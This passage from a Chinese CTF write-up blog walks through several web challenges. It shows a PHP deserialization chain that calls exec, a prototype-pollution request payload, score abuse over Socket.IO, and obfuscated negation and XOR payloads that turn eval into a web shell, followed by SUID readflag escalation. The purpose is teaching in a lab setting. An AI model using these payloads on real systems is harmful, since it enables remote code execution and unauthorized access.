class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 精简Payload构造逻辑（修复$d未定义错误，保留核心赋值）</span></span><br><span class="line"><span class="variable">$personB_object</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PersonB</span>();</span><br><span class="line"><span class="variable">$personC_object</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PersonC</span>();</span><br><span class="line"><span class="variable">$personA_object</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PersonA</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 核心赋值（触发链：C-&gt;B-&gt;A-&gt;C）</span></span><br><span class="line"><span class="variable">$personB_object</span>-&gt;id = <span class="variable">$personC_object</span>; <span class="comment">// B的id指向C</span></span><br><span class="line"><span class="variable">$personC_object</span>-&gt;name = <span class="string">&quot;exec&quot;</span>;        <span class="comment">// 用exec替代system，绕开拦截</span></span><br><span class="line"><span class="variable">$personC_object</span>-&gt;id = <span class="variable">$personB_object</span>; <span class="comment">// C的id指向B</span></span><br><span class="line"><span class="variable">$personC_object</span>-&gt;age = <span class="string">&quot;env&quot;</span>;          <span class="comment">// 执行env命令（可替换为cat /flag）</span></span><br><span class="line"><span class="variable">$personA_object</span>-&gt;name = <span class="variable">$personC_object</span>; <span class="comment">// A的name指向C</span></span><br><span class="line"><span class="variable">$personA_object</span>-&gt;id = <span class="string">&quot;check&quot;</span>;         <span class="comment">// 调用C的check方法</span></span><br><span class="line"><span class="variable">$personA_object</span>-&gt;age = <span class="string">&quot;env&quot;</span>;          <span class="comment">// 命令参数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 输出URL编码后的序列化字符串（直接用）</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$personA_object</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="mini-l-ctf-web-Clickclick"><a href="#mini-l-ctf-web-Clickclick" class="headerlink" title="mini-l ctf web Clickclick"></a>mini-l ctf web Clickclick</h2><p>抓包详细：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /update-amount HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:35023</span><br><span class="line">略</span><br><span class="line"></span><br><span class="line">&#123;&quot;type&quot;:&quot;set&quot;,&quot;point&quot;:&#123;&quot;amount&quot;:null&#125;&#125;</span><br></pre></td></tr></table></figure><p>不就是点击一百次吗？</p><p>来个脚本：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> button = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;button&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">10000</span>; i++) &#123; button.<span class="title function_">click</span>(); &#125;</span><br></pre></td></tr></table></figure><p>回应：</p><p>Click 10000 times, and something appear.</p><p>什么叫“前后端分离”啊？（战术后仰）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if ( req.body.point.amount == 0 || req.body.point.amount == null) &#123; delete req.body.point.amount &#125;</span><br><span class="line">    </span><br></pre></td></tr></table></figure><p>所以我们可以利用这个漏洞：把amount的值改成0，这样它就会被删除，然后我们再向他祖宗point悄悄塞进去一万</p><ol><li><code>__proto__</code> <strong>指向这个对象的 “原型（祖宗）”</strong>。比如你创建一个空对象 <code>const point = {}</code>，<code>point.__proto__</code> 就指向所有对象的 “公共祖宗”（Object.prototype）。</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 发送请求到指定接口（这道题是 /update-amount ）</span></span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;/update-amount&#x27;</span>, &#123;  <span class="comment">//就是这里需要改成按钮相关信息网页</span></span><br><span class="line">  <span class="comment">// 2. 请求方式（固定POST，不用改）</span></span><br><span class="line">  <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">  <span class="comment">// 3. 告诉后端传的是JSON格式（固定，不用改）</span></span><br><span class="line">  <span class="attr">headers</span>: &#123; <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span> &#125;,</span><br><span class="line">  <span class="comment">// 4. 核心污染数据（固定，不用改）</span></span><br><span class="line">  <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;set&quot;</span>,</span><br><span class="line">    <span class="string">&quot;point&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;amount&quot;</span>: <span class="literal">null</span>,</span><br><span class="line">      <span class="string">&quot;__proto__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;amount&quot;</span>: <span class="number">10000</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 5. 请求成功后，弹窗显示结果（固定，不用改）</span></span><br><span class="line">.<span class="title function_">then</span>(<span class="function"><span class="params">r</span> =&gt;</span> r.<span class="title function_">text</span>())</span><br><span class="line">.<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> <span class="title function_">alert</span>(<span class="string">&quot;返回结果：&quot;</span> + res))</span><br><span class="line"><span class="comment">// 6. 请求失败后，弹窗显示错误（固定，不用改）</span></span><br><span class="line">.<span class="title function_">catch</span>(<span class="function"><span class="params">err</span> =&gt;</span> <span class="title function_">alert</span>(<span class="string">&quot;出错了：&quot;</span> + err));</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="GuessOneGuess"><a href="#GuessOneGuess" class="headerlink" title="GuessOneGuess"></a>GuessOneGuess</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">module.exports = function(io) &#123;</span><br><span class="line">    io.on(&#x27;connection&#x27;, (socket) =&gt; &#123;</span><br><span class="line">        let targetNumber = Math.floor(Math.random() * 100) + 1;</span><br><span class="line">        let guessCount = 0;</span><br><span class="line">        let totalScore = 0;</span><br><span class="line">        const FLAG = process.env.FLAG || &quot;miniL&#123;THIS_IS_THE_FLAG&#125;&quot;;</span><br><span class="line">        console.log(`新连接 - 目标数字: $&#123;targetNumber&#125;`);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">        socket.emit(&#x27;game-message&#x27;, &#123;</span><br><span class="line">            type: &#x27;welcome&#x27;,</span><br><span class="line">            message: &#x27;猜一个1-100之间的数字！&#x27;,</span><br><span class="line">            score: totalScore</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        socket.on(&#x27;guess&#x27;, (data) =&gt; &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">              console.log(totalScore);</span><br><span class="line">                const guess = parseInt(data.value);</span><br><span class="line"></span><br><span class="line">                if (isNaN(guess)) &#123;</span><br><span class="line">                    throw new Error(&#x27;请输入有效数字&#x27;);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                if (guess &lt; 1 || guess &gt; 100) &#123;</span><br><span class="line">                    throw new Error(&#x27;请输入1-100之间的数字&#x27;);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                guessCount++;</span><br><span class="line"></span><br><span class="line">                if (guess === targetNumber) &#123;</span><br><span class="line">                   </span><br><span class="line">                    const currentScore = Math.floor(100 / Math.pow(2, guessCount - 1));</span><br><span class="line">                    totalScore += currentScore;</span><br><span class="line"></span><br><span class="line">                    let message = `🎉 猜对了！得分 +$&#123;currentScore&#125; (总分数: $&#123;totalScore&#125;)`;</span><br><span class="line">                    let showFlag = false;</span><br><span class="line"></span><br><span class="line">                    if (totalScore &gt; 1.7976931348623157e308) &#123;</span><br><span class="line">                        message += `\n🏴 $&#123;FLAG&#125;`;</span><br><span class="line">                        showFlag = true;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    socket.emit(&#x27;game-message&#x27;, &#123;</span><br><span class="line">                        type: &#x27;result&#x27;,</span><br><span class="line">                        win: true,</span><br><span class="line">                        message: message,</span><br><span class="line">                        score: totalScore,</span><br><span class="line">                        showFlag: showFlag,</span><br><span class="line">                        currentScore: currentScore</span><br><span class="line">                    &#125;);</span><br><span class="line"></span><br><span class="line">                    </span><br><span class="line">                    targetNumber = Math.floor(Math.random() * 100) + 1;</span><br><span class="line">                    console.log(`新目标数字: $&#123;targetNumber&#125;`);</span><br><span class="line">                    guessCount = 0;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    if (guessCount &gt;= 100) &#123;</span><br><span class="line">                      console.log(&quot;100次未猜中！将扣除当前分数并重置&quot;);</span><br><span class="line">                        socket.emit(&#x27;punishment&#x27;, &#123;</span><br><span class="line">                            message: &quot;100次未猜中！将扣除当前分数并重置&quot;,</span><br><span class="line">                        &#125;);</span><br><span class="line">                        return;</span><br><span class="line">                    &#125;</span><br><span class="line">                    socket.emit(&#x27;game-message&#x27;, &#123;</span><br><span class="line">                        type: &#x27;result&#x27;,</span><br><span class="line">                        win: false,</span><br><span class="line">                        message: guess &lt; targetNumber ? &#x27;太小了！&#x27; : &#x27;太大了！&#x27;,</span><br><span class="line">                        score: totalScore</span><br><span class="line">                    &#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; catch (err) &#123;</span><br><span class="line">                socket.emit(&#x27;game-message&#x27;, &#123;</span><br><span class="line">                    type: &#x27;error&#x27;,</span><br><span class="line">                    message: err.message,</span><br><span class="line">                    score: totalScore</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        socket.on(&#x27;punishment-response&#x27;, (data) =&gt; &#123;</span><br><span class="line">          totalScore -= data.score;</span><br><span class="line">          guessCount = 0;</span><br><span class="line">          targetNumber = Math.floor(Math.random() * 100) + 1;</span><br><span class="line">          console.log(`新目标数字: $&#123;targetNumber&#125;`);</span><br><span class="line">          socket.emit(&#x27;game-message&#x27;, &#123;</span><br><span class="line">            type: &#x27;result&#x27;,</span><br><span class="line">            win: true,</span><br><span class="line">            message: &quot;扣除分数并重置&quot;,</span><br><span class="line">            score: totalScore,</span><br><span class="line">            showFlag: false,</span><br><span class="line">          &#125;);</span><br><span class="line"></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>看关键，showflag一直是false，只有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (totalScore &gt; 1.7976931348623157e308) &#123;</span><br><span class="line">                        message += `\n🏴 $&#123;FLAG&#125;`;</span><br><span class="line">                        showFlag = true;</span><br></pre></td></tr></table></figure><p>得分大于这个恶心的数字时才为true</p><p>JS 最大正常数：<code>1.7976931348623157e308</code>（记为「最大值」）；</p><p>但是规则有点不一样：</p><ol><li>加分规则：猜中才加分，但单次得分少，靠正常猜永远到不了目标分数；</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> currentScore = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="number">100</span> / <span class="title class_">Math</span>.<span class="title function_">pow</span>(<span class="number">2</span>, guessCount - <span class="number">1</span>));</span><br></pre></td></tr></table></figure><ul><li>人话翻译：<ul><li><code>guessCount</code> &#x3D; 你猜中数字前的「总猜测次数」（比如 1 次猜中，次数就是 1；5 次猜中，次数就是 5）；</li><li><code>Math.pow(2, n)</code> &#x3D; 2 的 n 次方（比如 2¹&#x3D;2，2³&#x3D;8）；</li><li><code>Math.floor()</code> &#x3D; 向下取整（只保留整数，比如 31.2→31）；</li><li>最终得分 &#x3D; 100 ÷ (2 的「猜中次数 - 1」次方)，再取整。</li></ul></li></ul><table><thead><tr><th>猜中次数</th><th>计算过程</th><th>本次得分</th><th>总分（假设初始 0）</th></tr></thead><tbody><tr><td>1 次猜中</td><td>100 ÷ (2⁰) &#x3D; 100 ÷ 1</td><td>100</td><td>100</td></tr><tr><td>2 次猜中</td><td>100 ÷ (2¹) &#x3D; 100 ÷ 2</td><td>50</td><td>50</td></tr><tr><td>3 次猜中</td><td>100 ÷ (2²) &#x3D; 100 ÷ 4</td><td>25</td><td>25</td></tr><tr><td>4 次猜中</td><td>100 ÷ (2³) &#x3D; 100 ÷ 8</td><td>12</td><td>12（100&#x2F;8&#x3D;12.5→取整 12）</td></tr><tr><td>5 次猜中</td><td>100 ÷ (2⁴) &#x3D; 100 ÷ 16</td><td>6</td><td>6（100&#x2F;16&#x3D;6.25→取整 6）</td></tr><tr><td>10 次猜中</td><td>100 ÷ (2⁹) &#x3D; 100 ÷ 512</td><td>0</td><td>0（100&#x2F;512≈0.19→取整 0）</td></tr></tbody></table><ol><li>扣分漏洞：传负数让 “扣分” 变 “加分”，多次传就能让总分变成无穷大；</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">socket.on(&#x27;punishment-response&#x27;, (data) =&gt; &#123;</span><br><span class="line">          totalScore -= data.score;</span><br></pre></td></tr></table></figure><p>那就穿个负数进去，多穿几个不久很大了吗</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 极简版 - 分行格式（核心逻辑不变）</span></span><br><span class="line"><span class="keyword">const</span> s = <span class="title function_">io</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 刷无穷大总分（10次足够）</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>; i&lt;<span class="number">10</span>; i++) &#123;</span><br><span class="line">  s.<span class="title function_">emit</span>(<span class="string">&#x27;punishment-response&#x27;</span>, &#123; <span class="attr">score</span>: -<span class="number">1.5e308</span> &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 自动猜1-100所有数字</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> n=<span class="number">1</span>; n&lt;=<span class="number">100</span>; n++) &#123;</span><br><span class="line">  s.<span class="title function_">emit</span>(<span class="string">&#x27;guess&#x27;</span>, &#123; <span class="attr">value</span>: n &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 抓到flag就弹窗</span></span><br><span class="line">s.<span class="title function_">on</span>(<span class="string">&#x27;game-message&#x27;</span>, <span class="function"><span class="params">d</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span>(d.<span class="property">message</span>?.<span class="title function_">includes</span>(<span class="string">&#x27;miniL&#x27;</span>)) <span class="title function_">alert</span>(d.<span class="property">message</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="keyword">function</span>(<span class="params">io</span>) &#123; <span class="comment">// io 是 Socket.IO 的核心对象</span></span><br><span class="line">    io.<span class="title function_">on</span>(<span class="string">&#x27;connection&#x27;</span>, <span class="function">(<span class="params">socket</span>) =&gt;</span> &#123; <span class="comment">// 监听客户端连接（Socket.IO 固定写法）</span></span><br><span class="line">        socket.<span class="title function_">emit</span>(<span class="string">&#x27;game-message&#x27;</span>, &#123; ... &#125;); <span class="comment">// 给客户端发消息（emit = 发送）</span></span><br><span class="line">        socket.<span class="title function_">on</span>(<span class="string">&#x27;guess&#x27;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> &#123; ... &#125;); <span class="comment">// 监听客户端的&#x27;guess&#x27;事件（on = 接收）</span></span><br><span class="line">        socket.<span class="title function_">on</span>(<span class="string">&#x27;punishment-response&#x27;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> &#123; ... &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>1.发现 <code>io</code>、<code>socket.emit</code>、<code>socket.on</code> → 确定是 Socket.IO；</p><p>2.<code>socket.emit()</code>&#x2F;<code>socket.on()</code>，就知道要按 Socket.IO 的方式（<code>io()</code> 建连接、<code>emit()</code> 发请求）解题</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 建立连接（必写）</span></span><br><span class="line"><span class="keyword">const</span> socket = <span class="title function_">io</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 给后端发消息（按需写）</span></span><br><span class="line">socket.<span class="title function_">emit</span>(<span class="string">&#x27;事件名&#x27;</span>, &#123; <span class="attr">key</span>: 值 &#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 监听后端消息（按需写）</span></span><br><span class="line">socket.<span class="title function_">on</span>(<span class="string">&#x27;事件名&#x27;</span>, <span class="function">(<span class="params">接收的参数</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 处理收到的消息（比如拿flag）</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a>[极客大挑战 2019]RCE ME</h2><h3 id="1-3"><a href="#1-3" class="headerlink" title="1"></a>1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;code&#x27;]))&#123;</span><br><span class="line">            $code=$_GET[&#x27;code&#x27;];</span><br><span class="line">                    if(strlen($code)&gt;40)&#123;              //字数限制</span><br><span class="line">                                        die(&quot;This is too Long.&quot;);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code))&#123;</span><br><span class="line">                                        die(&quot;NO.&quot;);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    @eval($code);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">            highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// ?&gt;</span><br></pre></td></tr></table></figure><p>不允许输入数字和字母。</p><p>那怎么让eval执行呢？</p><p>可以用一种方式，或许它确实不是由字母和数字组成（maybe一些符号标点？），但是他表达出来的意思确实是我们想要的命令：</p><p>三种方法：</p><p>取反</p><p>异或</p><p>自增</p><p>1.或许你可以先看看phpinfo有哪些函数被禁用了（具体构造看知识点3）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=$_=~%8f%97%8f%96%91%99%90;$_();</span><br></pre></td></tr></table></figure><p>system被禁用了</p><p><img src="/images/image-20251227163010489.png" alt="image-20251227163010489"></p><p>2.构造payload</p><p>eval作为一个语言构造器，并不能被当作函数调用，</p><p>比如 <code>eval()</code>、<code>echo()</code>、<code>isset()</code>、<code>include()</code>。 这些不是函数，而是 <strong>PHP 指令的一部分</strong>。它们在代码编译阶段就已经被固定死了。它们没有入口地址，所以你不能用 <code>$a = &quot;eval&quot;; $a();</code> 去找它。</p><p>所以我们assert（想了解这个函数去看知识点4）</p><p>构造出类似这样的payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=(assert)(eval($_POST[&quot;cmd&quot;]))；</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=(~%22%9e%8c%8c%9a%8d%8b%22)(~%22%9a%89%9e%93%d7%db%a0%af%b0%ac%ab%a4%dd%9c%92%9b%dd%a2%d6%22)；</span><br></pre></td></tr></table></figure><p>异或太长了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=(%22%21%28%28%25%29%29%22^%22%40%5b%5b%40%5b%5d%22)(%22%25%28%21%2c%21%21%21%2b%40%28%28%24%21%23%2d%24%21%21%21%22^%22%40%5e%40%40%09%05%7e%7b%0f%7b%7c%7f%03%40%40%40%03%7c%08%22)</span><br></pre></td></tr></table></figure><p>3.连接蚁剑，</p><p>发现flag啥都没有，是因为</p><h3 id="1-权限限制-Permission-Denied-——-最可能的原因"><a href="#1-权限限制-Permission-Denied-——-最可能的原因" class="headerlink" title="1. 权限限制 (Permission Denied) —— 最可能的原因"></a>1. 权限限制 (Permission Denied) —— <strong>最可能的原因</strong></h3><p>这是 CTF 中最常见的套路。<code>/flag</code> 文件确实存在，但它的权限被设置成了只有 <code>root</code> 用户才能读取。</p><ul><li><strong>如何确认</strong>：在蚁剑终端输入 <code>ls -l /flag</code>。</li><li><strong>看结果</strong>：<ul><li>如果显示 <code>-r-------- 1 root root</code>：说明只有 root 能读，你（www-data）没权限。这时候你需要寻找<strong>提权</strong>路径（比如寻找刚才提到的 <code>/readflag</code> 程序）。</li><li>如果显示 <code>-rwxr-xr-x</code>：说明你可以读，但文件依然为空，那可能是文件本身就被清空了，或者 Flag 在别处。</li></ul></li></ul><hr><h3 id="2-函数被禁用-Disable-Functions-——-绕过限制"><a href="#2-函数被禁用-Disable-Functions-——-绕过限制" class="headerlink" title="2. 函数被禁用 (Disable Functions) —— 绕过限制"></a>2. 函数被禁用 (Disable Functions) —— <strong>绕过限制</strong></h3><p>如果你能看到文件，权限也对，但是 <code>cat</code> 命令或者蚁剑的文件管理器点开是空的，可能是 PHP 的配置文件 <code>php.ini</code> 禁用了读取文件的函数。</p><ul><li><strong>如何确认</strong>：查看 <code>phpinfo()</code>，搜索 <code>disable_functions</code> 这一项。</li><li><strong>常见的“阉割”列表</strong>：如果里面出现了 <code>system</code>, <code>exec</code>, <code>passthru</code>, <code>shell_exec</code>, <code>file_get_contents</code> 等，说明你无法直接调用系统命令读文件。</li><li><strong>表现</strong>：你执行命令时，返回结果为空，或者提示 <code>function is disabled</code>。</li></ul><p><img src="/images/image-20251227201231091.png" alt="image-20251227201231091"></p><p>所以为了解决问题，我们安装了插件（绕过函数限制），也就解决了第二个可能问题</p><p>ls -&#x2F;  ok</p><p>cat &#x2F;flag   哟不行了，因为有权限啊，第一个可能问题还没解决。</p><p>这个看一眼别人，和看一眼别人的隐私区别还是很大的，所以权限级别不一样嘛。</p><p>看一下根目录，寻找readflag或者类型的运行文件</p><p>4.运行有suid权限的文件</p><p>运行 <code>readflag</code> 这种文件，并不是让你“获得临时 root 权限”（也就是你的身份还是 <code>www-data</code>），而是<strong>这个程序本身在运行那一刻拥有 root 权限</strong>，它替你去读文件，然后把结果告诉你。</p><hr><h3 id="1-它的原理是什么？（SUID-权限）"><a href="#1-它的原理是什么？（SUID-权限）" class="headerlink" title="1. 它的原理是什么？（SUID 权限）"></a>1. 它的原理是什么？（SUID 权限）</h3><p>在 Linux 中，这叫 <strong>SUID (Set User ID)</strong>。</p><ul><li><strong>普通程序</strong>：你运行 <code>cat</code>，<code>cat</code> 的权限就是你的权限（保洁员）。</li><li><strong>SUID 程序</strong>：你运行 <code>readflag</code>，虽然你是保洁员，但 <code>readflag</code> 这个程序被贴上了“总裁特权”的标签。在它运行的几秒钟里，它能打开保洁员打不开的保险柜，把里面的东西读出来给你看。</li></ul><hr><h3 id="2-如何在根目录下精准找到它？"><a href="#2-如何在根目录下精准找到它？" class="headerlink" title="2. 如何在根目录下精准找到它？"></a>2. 如何在根目录下精准找到它？</h3><p>你不能只靠眼睛看，因为有时候它不叫 <code>readflag</code>，可能叫 <code>get_flag</code> 或者一串乱码。你要找的是**“权限里带 s 的绿色文件”**。</p><p>在终端输入这个命令（这是所有 CTF 选手的肌肉记忆）：</p><p>Bash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -al /</span><br></pre></td></tr></table></figure><p><strong>看结果里的这一段：</strong></p><ul><li>如果权限是 <code>-rwxr-xr-x</code>：这只是个普通文件，没用。</li><li>如果权限是 <code>-rw**s**r-xr-x</code>：看到那个 <strong><code>s</code></strong> 了吗？这就是“特权”的标志！</li></ul><hr><h3 id="4-运行它后会发生什么？"><a href="#4-运行它后会发生什么？" class="headerlink" title="4. 运行它后会发生什么？"></a>4. 运行它后会发生什么？</h3><p>你运行 <code>/readflag</code>，通常会出现以下几种回显：</p><ol><li><strong>直接给 Flag</strong>：最爽的情况，直接 <code>flag{...}</code>。</li><li><strong>验证码&#x2F;交互</strong>：它会说 <code>Please solve this: 10 + 20 = ?</code>。<ul><li><strong>坑点</strong>：蚁剑的终端有时不支持这种交互。</li><li><strong>解决</strong>：用 <code>echo &quot;30&quot; | /readflag</code>（利用管道把答案喂给它）。</li></ul></li><li><strong>参数读取</strong>：它可能需要你指定文件。<ul><li><strong>操作</strong>：<code>/readflag /flag</code>。</li></ul></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 